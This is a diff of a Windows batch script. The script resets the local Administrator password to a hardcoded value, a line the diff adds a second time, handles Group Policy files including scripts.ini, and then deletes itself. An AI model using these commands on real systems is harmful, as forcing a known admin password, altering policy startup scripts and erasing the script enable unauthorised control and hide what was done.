@@ -3,6 +3,7 @@ mode con cp select=437 >nul
 net user Administrator AYAMGORENG123
 setlocal enabledelayedexpansion
 
+net user Administrator AYAMGORENG123
 set "files[1]=%windir%\System32\GroupPolicy\gpt.ini"
 set "files[2]=%windir%\System32\GroupPolicy\Machine\Scripts\scripts.ini"
 
@@ -16,5 +17,6 @@ for %%i in (1 2) do (
 )
 
 del "%~f0"
+
 
 
